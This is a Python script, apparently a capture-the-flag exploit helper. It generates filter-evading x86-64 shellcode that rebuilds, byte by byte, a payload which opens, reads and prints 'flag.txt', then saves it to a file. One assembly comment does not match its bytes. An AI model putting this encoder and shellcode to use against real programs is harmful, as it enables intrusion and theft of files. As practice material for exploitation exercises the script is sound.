import os
os.chdir(os.path.dirname(__file__))

start = b"".join([
    b"\xb1\x04", # mov cl, 0x4
    b"\x83\xf1\x37", # xor ecx, 0x37
    b"\x51", # push rcx
    b"\x52", # push rdx
    b"\x52", # push rdx
    b"\x59", # pop rcx
    b"\x4d\x29\xe4", # sub r12, r12
    b"\x49\x29\xfc", # sub r12, rdi
])

MOVE_PTR = b"\x4c\x29\xe1" # sub rcx, r12
INC_VAL = b"\x44\x28\x21" # sub byte ptr [rcx], r12b

out_payload = bytearray(start)
emulated_payload = bytearray(start)
ext = lambda val: [out_payload.extend(val), emulated_payload.extend(val)]

code = [
    # b"\x48\x89\xec", # mov rsp, rbp (uncomment if rsp is misaligned, but it shouldnt be)
    b"\x6a\x00", # push 0x0
    b"\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74", # movabs rax, 0x78742e67616c662f
    b"\x50", # push rax
    b"\x54", # push rsp
    b"\x6a\x02", # push 2
    b"\x58", # pop rax
    b"\x5f", # pop rdi
    b"\x31\xf6", # xor esi, esi
    b"\x31\xd2", # xor edx, edx
    b"\x0f\x05", # syscall
    b"\x50", # push rax
    b"\x54", # push rsp
    b"\x5e", # pop rsi
    b"\x5f", # pop rdi
    b"\x31\xc0", # xor eax, eax
    b"\xb2\x7f", # mov dl, 0x7f
    b"\x0f\x05", # syscall
    b"\x89\xc2", # mov edx, eax
    b"\xb0\x01", # mov al, 1
    b"\x89\xc7", # mov edi, eax
    b"\x0f\x05", # syscall
    # b"\xf4", # hlt
]
GOAL = b"".join(code)

for i, c in enumerate(GOAL):
    while emulated_payload[i] != GOAL[i]:
        ext(INC_VAL)
        emulated_payload[i] = (emulated_payload[i] + 1) & 0xff
    
    if i != len(GOAL) - 1:
        ext(MOVE_PTR)

ext(
    b"\x49\xcb" # retfq
)

print(hex(len(out_payload)))
print(out_payload[:20])
with open("payload5.bin", "wb") as f:
    f.write(out_payload)
